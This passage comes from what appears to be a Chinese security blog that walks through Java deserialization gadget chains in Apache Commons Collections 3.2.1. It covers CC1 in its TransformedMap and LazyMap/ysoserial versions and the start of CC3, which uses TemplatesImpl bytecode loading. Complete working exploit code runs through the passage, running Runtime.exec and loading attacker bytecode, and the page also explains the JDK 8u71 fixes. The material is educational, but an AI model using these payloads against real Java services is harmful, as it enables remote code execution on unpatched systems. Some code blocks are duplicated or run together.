class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap );</span><br><span class="line"></span><br><span class="line">        SER(o);</span><br><span class="line"><span class="comment">//        UNSER(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SER</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">UNSER</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ysoserial版本CC1"><a href="#ysoserial版本CC1" class="headerlink" title="ysoserial版本CC1"></a>ysoserial版本CC1</h2><p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523202238209.png" alt="image-20240523202238209"></p>
<p>其实这后面这部分和TransformMap版本是一样的。我们当时想调用<code>TransformMap.transform()</code>方法，TransformMap版本使用的是<code>TransformMap.checkSetValue()</code>。ysoserial版本使用的是<code>LazyMap.get()</code>。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523202537062.png" alt="image-20240523202537062"></p>
<p> factory正好传入我们之前的<code>ChainedTransformer</code></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523210551073.png" alt="image-20240523210551073"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523210636955.png" alt="image-20240523210636955"></p>
<p>LazyMap的意思是一开始不写key，等调用的时候通过transform()调用key，所以一开始要确保没有key;</p>
<p>接下来就找谁调用了get(),找到了<code>AnnotationInvocationHandler.invoke()</code>，而动态代理类会自动执行invoke方法，过这里的判断很简单，只需要不调用equls方法和不调用有参方法就能过这两个if。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523211936873.png" alt="image-20240523211936873"></p>
<p><code>AnnotationInvocationHandler</code>从名字来看就是动态处理器类又正好<code>AnnotationInvocationHandler.readObject</code> 调用了<code>entrySet()</code>正好撞在枪口上。menberValues又可控。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523212053262.png" alt="image-20240523212053262"></p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span>(InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Target.class, lazyMap );</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, mapProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        SER(o);</span></span><br><span class="line">        UNSER(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SER</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">UNSER</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523205520055.png" alt="image-20240523205520055"></p>
<h2 id="后续官方修复方式"><a href="#后续官方修复方式" class="headerlink" title="后续官方修复方式"></a>后续官方修复方式</h2><h3 id="对于TransformMap版"><a href="#对于TransformMap版" class="headerlink" title="对于TransformMap版"></a>对于TransformMap版</h3><p>JDK 8u71 及以后的版本没有了能调用 ReadObject 中 <code>setValue()</code> 方法的地方。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/2024-05-24%20110816.png" alt="2024-05-24 110816"></p>
<h3 id="对于ysoserial版"><a href="#对于ysoserial版" class="headerlink" title="对于ysoserial版"></a>对于ysoserial版</h3><p>因为在8u71之后的版本反序列化不再通过<code>defaultReadObject</code>方式，而是通过<code>readFields</code> 来获取几个特定的属性，<code>defaultReadObject</code> 可以恢复对象本身的类属性，比如<code>this.memberValues</code> 就能恢复成我们原本设置的恶意类，但通过<code>readFields</code>方式，<code>this.memberValues</code> 就为null，所以后续执行get()就必然没发触发，这也就是高版本不能使用的原因。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240524111729060.png" alt="image-20240524111729060"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/2024-05-24%20111150.png" alt="2024-05-24 111150"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons Collections包和简介</a></p>
<p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></p>
<p><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Java反序列化Commons-Collections篇01-CC1链</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC3</title>
    <url>/2024/05/27/JAVA%E5%AE%89%E5%85%A8/CC3/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC1和CC2都是通过反序列化自动执行了object()方法最终导致了<code>InvokerTransformer.transform(Method.invoke())</code>的命令执行，那有没有一种可能，不通过<code>InvokerTransformer.transform(Method.invoke())</code>来进行命令执行？CC3给出了答案，CC3是通过JAVA的动态类加载机制来自动执行恶意类代码。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li><p>JDK8u65</p>
</li>
<li><p>Commons-Collections 3.2.1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  </span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">         &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">         &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">         &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">     &lt;/dependency&gt;</span><br><span class="line">  </span><br><span class="line"> &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="JAVA动态类加载"><a href="#JAVA动态类加载" class="headerlink" title="JAVA动态类加载"></a>JAVA动态类加载</h2><h3 id="利用URLClassLoader加载class文件"><a href="#利用URLClassLoader加载class文件" class="headerlink" title="利用URLClassLoader加载class文件"></a>利用URLClassLoader加载class文件</h3><p>Java的<code>ClassLoader</code>来用来加载字节码文件最基础的方法，<code>ClassLoader </code>是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的<code> ClassLoader</code> 就是根据类名来加载类，这个类名是类完整路径，如<code>java.lang.Runtime</code>。</p>
<p><code>URLClassLoader</code> 实际上是我们平时默认使用的 <code>AppClassLoader </code>的父类，所以，我们解释 <code>URLClassLoader </code>的工作过程实际上就是在解释默认的Java类加载器的工作流程。 </p>
<p>正常情况下，Java会根据配置项 <code>sun.boot.class.path </code>和<code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p>
<ul>
<li><p>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 <code>JarLoader </code>来寻找类，即为在Jar包中寻 找.class文件。</p>
</li>
<li><p>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 <code>FileLoader </code>来寻找类，即为在本地文件系统中寻 找.class文件 。</p>
</li>
<li><p>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。我们可以使用HTTP协议来测试一下，看Java是否能从远程HTTP服务器上加载.class文件。</p>
</li>
</ul>
<h4 id="http远程加载："><a href="#http远程加载：" class="headerlink" title="http远程加载："></a>http远程加载：</h4><p>我们编译一个恶意类，放在 <a href="http://localhost/Test.class">http://localhost/Test.class</a></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527234616607.png" alt="image-20240527234616607"></p>
<p> 成功请求到我们的 &#x2F;Test.class 文件，并执行了文件里的字节码。 所以，作为攻击者，如果我们能够控制目标<code> ClassLoader</code>的基础路径为一个http服务器，则可以利 用远程加载的方式执行任意代码了。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240528082827361.png" alt="image-20240528082827361"></p>
<h4 id="file本地加载"><a href="#file本地加载" class="headerlink" title="file本地加载:"></a>file本地加载:</h4><p>我们编译Test类，放在”C:\Users\Desktop” ，也是执行了文件里的字节码。他是则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻 找.class文件 。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527234632078.png" alt="image-20240527234632078"></p>
<h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><p>前面我们认识到了如何利用<code>URLClassLoader</code>加载远程class文件，也就是字节码。其实，不管是加 载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240528090248851.png" alt="image-20240528090248851"></p>
<ul>
<li>其中： <code>loadClass </code>的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行<code> findClass</code> 。</li>
<li><code>findClass</code> 的作用是根据基础URL指定的方式来加载类的字节码，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 <code>defineClass</code>。</li>
<li><code>defineClass</code> 的作用是处理前面传入的字节码，将其处理成真正的Java类 。</li>
</ul>
<p>所以可见，真正核心的部分其实是 <code>defineClass</code> ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 <code>ClassLoader#defineClass </code>是一个native方法，逻辑在JVM的C语言代码中。 </p>
<p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中，在<code> defineClass</code> 时也无法被直接调用到。所以，如果我们要使用 <code>defineClass</code> 在目标机器上执行任意代码，需要想办法调用构造函数。</p>
<p>（不进行初始化）</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240528084507413.png" alt="image-20240528084507413"></p>
<p>（初始化）</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240528084342573.png" alt="image-20240528084342573"></p>
<p>这里，因为系统的<code> ClassLoader#defineClass</code> 是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用。 在实际场景中，因为<code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 TemplatesImpl 的基石。</p>
<h2 id="TemplatesImpl-解析"><a href="#TemplatesImpl-解析" class="headerlink" title="TemplatesImpl 解析"></a>TemplatesImpl 解析</h2><p>我们知道defineClass()可以直接加载字节码，那我们可以像之前找CC链一样，反过去找谁调用了defineClass()，找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>下的<code>TemplatesImpl.TransletCLassLoader.defineClass()</code></p>
<p>JAVA中没有访问权限修饰词的是default类型，它可以访问在同一个包中的其他类的成员。	</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240526215828567.png" alt="image-20240526215828567"></p>
<p>看哪调用了<code> defineClass</code>，看到还是同类<code>TemplatesImpl.defineTransletClasses()</code>调用了<code>defineClass </code>但还是private，又找哪里调用了<code>defineTransletClasses ()</code>。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240526220246988.png" alt="image-20240526220246988"></p>
<p>找到了<code> TemplatesImpl.getTransletInstance()</code>，正好<code>newInstance()</code>,但是还是 private。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240526220419165.png" alt="image-20240526220419165"></p>
<p>最终找到了 <code>TemplatesImpl.newTransformer()</code>是public</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240526220516376.png" alt="image-20240526220516376"></p>
<p>正好这个类继承了Serializable接口，就很方便我们</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527105116341.png" alt="image-20240527105116341"></p>
<p>调用链</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527154250480.png" alt="image-20240527154250480"></p>
<h3 id="实现TemplatesImpl的逻辑"><a href="#实现TemplatesImpl的逻辑" class="headerlink" title="实现TemplatesImpl的逻辑"></a>实现TemplatesImpl的逻辑</h3><p>按照上面的步骤代码其实就需要这两行，但是肯定这样是不能运行的。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527105424926.png" alt="image-20240527105424926"></p>
<p>让我们跟进<code>TemplatesImpl()</code>，其实后面的不赋值，也能走到我们想要的<code>getTransletInstance()</code>，跟进<code>getTransletInstance()</code></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527105723051.png" alt="image-20240527105723051"></p>
<p><code>_name</code>需要赋值</p>
<p><code>_class</code>不能赋值，因为我们就想调用<code>defineTransletClasses()</code></p>
<p>跟进<code> defineTransletClasses()</code></p>
<p>随后代码会走到<code>_class[transletIndex].newInstance()</code></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527105855030.png" alt="image-20240527105855030"></p>
<p>跟进<code> defineTransletClasses()</code></p>
<p><code>_bytecodes</code>需要赋值</p>
<p><code>_tfactory</code>需要调方法，需要赋值,去看一下 <code>_tfactory</code>是什么</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527110211207.png" alt="image-20240527110211207"></p>
<p>可以看到<code>_tfactory</code>是transient，也就是说它并不能序列化。这就很有意思了，要用但是不能序列化，那有可能在<code>readObect()</code>里面。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527110600370.png" alt="image-20240527110600370"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527110644855.png" alt="image-20240527110644855"></p>
<p>随后<code>defineClass(_bytecodes[i])</code>加载字节码</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527213049967.png" alt="image-20240527213049967"></p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>其他的都很简单，唯一的难点是可能不知道这里为啥这样写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//14341//Desktop/Tests.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesField.set(templates, codes);</span><br></pre></td></tr></table></figure>

<p>因为_bytecodes是一个二维数组</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527213730267.png" alt="image-20240527213730267"></p>
<p>但是<code>defineClass()</code>接收一个一维数组</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527213808776.png" alt="image-20240527213808776"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h3><p>遇到一个空指针错误</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527112539992.png" alt="image-20240527112539992"></p>
<p>这里打个断点调试一下<img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527153320593.png" alt="image-20240527153320593"></p>
<p>可以看到这里空指针报错，看一下逻辑，就是要求<code>_bytecodes</code>父类为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p>然后把i的值赋给<code>_transletIndex</code>  (_transletIndex默认为-1) ，否则就空指针报错。</p>
<p>当<code>_transletIndex</code>&lt;0也会报错。所以只能将父类改为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527170701421.png" alt="image-20240527170701421"></p>
<p>导入<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 发现需要实现两个接口</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527113056413.png" alt="image-20240527113056413"></p>
<p><code>TemplatesImpl</code>的所有逻辑就走完了</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240527173454095.png" alt="image-20240527173454095"></p>
<h2 id="CC1的TemplatesImpl-的实现方式"><a href="#CC1的TemplatesImpl-的实现方式" class="headerlink" title="CC1的TemplatesImpl 的实现方式"></a>CC1的TemplatesImpl 的实现方式</h2><p>没有什么特别的地方，本质上来讲就是换了一个执行命令的地方</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        